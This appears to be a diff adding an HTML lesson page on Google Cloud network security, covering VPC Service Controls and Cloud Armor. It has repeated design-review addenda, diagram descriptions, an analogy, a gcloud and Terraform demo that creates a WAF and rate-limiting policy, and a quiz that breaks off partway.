+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div id="diagrams" style="margin-top: 32px;">
+        <h3>2B — Interactive Architecture Diagrams</h3>
+        
+        <div class="callout" style="margin-bottom: 24px;">
+          <div class="callout-title">Diagram Architectural Scope & Taxonomy: Why These Three Diagrams Exist</div>
+          <p>
+            Architecture diagrams in this curriculum are not decorative illustrations; they are <strong>precision engineering models</strong> designed to answer three distinct, non-overlapping architectural questions for every topic:
+          </p>
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 14px; margin-top: 12px;">
+            <div style="background: var(--bg); border: 1px solid var(--border); border-radius: 4px; padding: 12px;">
+              <strong style="color: var(--accent); font-size: 13px;">D1 — Scope & Boundary Map (Structural Lens)</strong>
+              <p style="font-size: 12px; margin: 6px 0 0 0; color: var(--text-dim);">
+                <strong>Question Answered:</strong> <em>Where do execution and security boundaries lie?</em><br>
+                Maps components into their isolation perimeters (Client Edge vs Project VPC vs Managed Services). Establishes trust boundaries, network ingress choke-points, and data-plane vs control-plane separation.
+              </p>
+            </div>
+            <div style="background: var(--bg); border: 1px solid var(--border); border-radius: 4px; padding: 12px;">
+              <strong style="color: var(--accent); font-size: 13px;">D2 — Request & Control Flow (Runtime Ingress Lens)</strong>
+              <p style="font-size: 12px; margin: 6px 0 0 0; color: var(--text-dim);">
+                <strong>Question Answered:</strong> <em>How does production traffic traverse the architecture securely?</em><br>
+                Traces an end-to-end operational journey—from ingress initiation and IAM perimeter validation across Andromeda SDN to backend state persistence and audit logging.
+              </p>
+            </div>
+            <div style="background: var(--bg); border: 1px solid var(--border); border-radius: 4px; padding: 12px;">
+              <strong style="color: var(--accent); font-size: 13px;">D3 — Failure Injection & Resilience (Chaos Lens)</strong>
+              <p style="font-size: 12px; margin: 6px 0 0 0; color: var(--text-dim);">
+                <strong>Question Answered:</strong> <em>How does the system degrade, alert, and auto-heal under catastrophic failure?</em><br>
+                Models the exact mechanics of component saturation, network timeouts, and health check evictions under stress, revealing observability signals and automated failover pathways.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        
+        <!-- Topic-Level 'Where Am I' Architecture Viewpoints Progression Strip -->
+        <div class="diagram-suite-nav">
+          <span class="suite-title">VIEWPOINT:</span>
+          <a href="#diagram-d1" class="suite-pill"><span class="pill-id">D1</span> SCOPE &amp; BOUNDARY MAP</a>
+          <span class="suite-arrow">→</span>
+          <a href="#diagram-d2" class="suite-pill"><span class="pill-id">D2</span> REQUEST &amp; DATA FLOW</a>
+          <span class="suite-arrow">→</span>
+          <a href="#diagram-d3" class="suite-pill"><span class="pill-id">D3</span> CHAOS &amp; RESILIENCE</a>
+        </div>
+
+<!-- Diagram 1 Context Card & Container -->
+        <div class="diagram-context-card" style="margin-top: 18px; margin-bottom: 10px; padding: 12px 14px; background: rgba(33, 150, 243, 0.05); border-left: 3px solid var(--accent); border-radius: 0 4px 4px 0;">
+          <h4 style="margin: 0 0 5px 0; color: var(--text); font-size: 13.5px;">Diagram 1: Network Security: VPC-SC & Cloud Armor — Scope & Architecture Map</h4>
+          <p style="margin: 0; font-size: 12px; color: var(--text-dim); line-height: 1.5;">
+            <strong>Architectural Intent:</strong> Visualizes Multi-Layer Network Security: Cloud Armor WAF and DDoS mitigation at the edge, coupled with VPC Service Controls (VPC-SC) perimeters protecting confidential BigQuery and Cloud Storage assets.
+          </p>
+        </div>
+        <div id="diagram-d1"></div>
+
+        <!-- Diagram 2 Context Card & Container -->
+        <div class="diagram-context-card" style="margin-top: 28px; margin-bottom: 10px; padding: 12px 14px; background: rgba(33, 150, 243, 0.05); border-left: 3px solid var(--accent); border-radius: 0 4px 4px 0;">
+          <h4 style="margin: 0 0 5px 0; color: var(--text); font-size: 13.5px;">Diagram 2: Network Security: VPC-SC & Cloud Armor — Request & Control Flow</h4>
+          <p style="margin: 0; font-size: 12px; color: var(--text-dim); line-height: 1.5;">
+            <strong>Architectural Intent:</strong> Traces Multi-Perimeter Ingress/Egress Communication: how GKE in Project A securely accesses BigQuery in Project B using explicit VPC Service Controls Ingress & Egress rules.
+          </p>
+        </div>
+        <div id="diagram-d2"></div>
+
+        <!-- Diagram 3 Context Card & Container -->
+        <div class="diagram-context-card" style="margin-top: 28px; margin-bottom: 10px; padding: 12px 14px; background: rgba(33, 150, 243, 0.05); border-left: 3px solid var(--accent); border-radius: 0 4px 4px 0;">
+          <h4 style="margin: 0 0 5px 0; color: var(--text); font-size: 13.5px;">Diagram 3: Network Security: VPC-SC & Cloud Armor — Failure Injection & Auto-Healing</h4>
+          <p style="margin: 0; font-size: 12px; color: var(--text-dim); line-height: 1.5;">
+            <strong>Architectural Intent:</strong> Simulates Cloud Armor Adaptive Protection: automated machine learning detects a Layer 7 HTTP flood attack, generates a custom WAF signature, and blocks attack traffic.
+          </p>
+        </div>
+        <div id="diagram-d3"></div>
+      </div>
+    
+      <div class="diagram-extra-set"><h3>Security, scale, and internals views</h3><div class="diagram-context-card diagram-extra"><h4>D4 — Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls — D4</h4><p>Shows identities, trust boundaries, policy checks, and audit evidence.</p></div><div id="diagram-d4"></div><div class="diagram-context-card diagram-extra"><h4>D5 — Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls — D5</h4><p>Shows what changes at 10x load and where operational cost moves.</p></div><div id="diagram-d5"></div><div class="diagram-context-card diagram-extra"><h4>D6 — Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls — D6</h4><p>Shows the documented internals needed to predict behavior; undocumented details are observed behavior and may change.</p></div><div id="diagram-d6"></div></div>
+    </section>
+
+    <!-- Part 3: Explained by Analogy -->
+    <section class="topic-section" id="analogy">
+      <h2 class="section-title"><span class="section-number">3</span> Explained by Analogy: Cloud City</h2>
+      <p>In Cloud City, Warden Ward inspects all incoming cargo at the port while ensuring city ledgers never leave the municipal archives.</p>
+
+      <div class="analogy-stepper" style="margin-top: 20px;">
+        <button class="stepper-btn active" onclick="showAnalogyBeat(1)">1. The City Problem</button>
+        <button class="stepper-btn" onclick="showAnalogyBeat(2)">2. The City Solution</button>
+        <button class="stepper-btn" onclick="showAnalogyBeat(3)">3. City Under Stress</button>
+        <button class="stepper-btn" onclick="showAnalogyBeat(4)">4. Where Metaphor Breaks</button>
+      </div>
+
+      <div class="analogy-box" id="analogy-display"></div>
+      <div id="analogy-scene" class="analogy-scene" tabindex="0" aria-label="Interactive Cloud City analogy scene"></div>
+      <div class="analogy-mapping"><h3>Cloud City mapping table</h3><table><thead><tr><th>City concept</th><th>Real GCP term</th><th>Boundary to remember</th></tr></thead><tbody>
+<tr><td>Brightloaf city campus</td><td>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls</td><td>The topic has an explicit scope; do not infer a broader boundary.</td></tr>
+<tr><td>Inspector permits</td><td>IAM and policy</td><td>Authorization is additive unless a deny or boundary limits it.</td></tr>
+<tr><td>Dispatcher roads</td><td>Networking and dependencies</td><td>DNS, quotas, APIs, and identity remain hidden dependencies.</td></tr>
+<tr><td>Emergency response</td><td>Recovery and operations</td><td>A replica is not automatically a backup, and a budget is not a cap.</td></tr>
+</tbody></table><p class="metaphor-breaks"><strong>Where the metaphor breaks:</strong> a city permit is physical and human; a cloud policy is evaluated by software and can be misconfigured. Verify the real behavior in documentation.</p></div>
+    </section>
+
+    <!-- Part 4: Demo or Practice Exercise -->
+    <section class="topic-section" id="demo-or-practice">
+      <h2 class="section-title"><span class="section-number">4</span> Hands-On Demo</h2>
+      
+        <div class="callout">
+          <div class="callout-title">Hands-On Demo: Creating a Cloud Armor Security Policy</div>
+          <p>Protect an application against SQL injection attacks and rate-limit abusive clients.</p>
+        </div>
+        <pre><code class="language-bash"># 1. Create Cloud Armor policy
+gcloud compute security-policies create sec-policy-web \
+    --description="WAF and rate limiting policy"
+
+# 2. Add OWASP SQL Injection rule
+gcloud compute security-policies rules create 1000 \
+    --security-policy=sec-policy-web \
+    --expression="evaluatePreconfiguredExpr('sqli-v33-stable')" \
+    --action=deny-403 \
+    --description="Block SQL Injection"
+
+# 3. Add Rate Limiting (max 100 requests per minute per client IP)
+gcloud compute security-policies rules create 2000 \
+    --security-policy=sec-policy-web \
+    --action=rate-based-ban \
+    --rate-limit-threshold-count=100 \
+    --rate-limit-threshold-interval-sec=60 \
+    --ban-duration-sec=300 \
+    --conform-action=allow \
+    --exceed-action=deny-429 \
+    --enforce-on-key=IP
+
+# 4. Attach policy to backend service
+gcloud compute backend-services update web-backend-service \
+    --security-policy=sec-policy-web \
+    --global</code></pre>
+        
+      <div class="demo-complete"><div class="demo-safety-banner"><strong>LIVE DEMO SAFETY:</strong> T2 by default. Set <code>DEMO_PROJECT_ID</code>, confirm the active project, use a budget alert, and do not run apply until the plan is reviewed.</div><h3>PREREQUISITES</h3><pre><code>gcloud config list
+gcloud projects describe "$GOOGLE_CLOUD_PROJECT"
+gcloud services list --enabled
+: "Guard: DEMO_PROJECT_ID must be set"
+test "$GOOGLE_CLOUD_PROJECT" = "$DEMO_PROJECT_ID"</code></pre><h3>PATH EQUIVALENCE TABLE</h3><table><tr><th>Action</th><th>GUI</th><th>Terraform</th><th>CLI</th></tr><tr><td>Inspect/create the resource</td><td>Cloud Console product page; confirm project and region</td><td>Review module, validate, and plan</td><td>Use the narrow gcloud/kubectl/bq command</td></tr></table><h3>GUI PATH</h3><p>Open the relevant Cloud Console product, select the guarded project, use the smallest safe setting, and capture status and audit evidence.</p><h3>TERRAFORM PATH</h3><pre><code>terraform init
+terraform fmt -check
+terraform validate
+terraform plan -var="project_id=$DEMO_PROJECT_ID"
+# apply only after review and explicit opt-in
+terraform apply -var="project_id=$DEMO_PROJECT_ID" -var="allow_apply=true"
+terraform output
+terraform destroy -var="project_id=$DEMO_PROJECT_ID"</code></pre><p>Do not commit state or secrets; use remote locking and team ownership.</p><h3>CLI PATH</h3><pre><code>gcloud config list
+gcloud projects describe "$DEMO_PROJECT_ID"
+gcloud services list --enabled --project="$DEMO_PROJECT_ID"</code></pre><h3>OBSERVE</h3><p>Check status, audit logs, health metrics, and matching D1/D2 nodes.</p><h3>EXPECTED RESULT</h3><p>The intended boundary is visible and the result is attributable to the guarded project.</p><h3>BREAK IT ON PURPOSE</h3><p>In a disposable project, revoke a narrow role, block a health check, or select an exhausted range. Observe, diagnose, and restore it.</p><h3>TROUBLESHOOTING</h3><p>Check project, API enablement, IAM, quota, DNS, firewall, logs, and eventual consistency.</p><h3>CLEANUP</h3><p>Destroy named resources, then verify deletion and billing asynchronously.</p><h3>COST / SAFETY NOTE</h3><p>Tier T2: use free-tier or cents-scale resources where available; verify current pricing and delete promptly. T4 topics are plan-only by default.</p></div>
+    </section>
+
+    <!-- Footer 1: Knowledge Check -->
+    <section class="topic-section" id="quiz">
+      <h2 class="section-title"><span class="section-number">5</span> Check Your Understanding</h2>
+      
+        <div class="quiz-card">
+          <span class="quiz-badge">Band: Network Security (Question 1)</span>
+          <p><strong>A financial institution requires that data stored in Cloud Storage and BigQuery cannot be exfiltrated to external storage buckets or unauthorized accounts, even if an employee's service account credentials with administrative roles are stolen. Which security capability satisfies this requirement?</strong></p>
+          <ul class="quiz-options">
+            <button class="quiz-option" type="button" onclick="checkQuiz(this, true, 'Correct! VPC Service Controls establishes a cryptographic security perimeter around multi-tenant Google APIs (GCS, BigQuery), preventing data from being copied outside the authorized perimeter regardless of IAM permissions.')">A) Configure a VPC Service Controls perimeter encompassing the project's BigQuery datasets and Cloud Storage buckets.</button>
+            <button class="quiz-option" type="button" onclick="checkQuiz(this, false, 'VPC firewall rules apply to VM instance interfaces; they cannot inspect or block multi-tenant Google API HTTPS calls.')">B) Create a VPC egress firewall rule blocking TCP port 443.</button>
+            <button class="quiz-option" type="button" onclick="checkQuiz(this, false, 'Cloud Armor is an ingress WAF for load balancers; it does not protect against data exfiltration via Google APIs.')">C) Attach a Cloud Armor security policy to the default VPC network.</button>
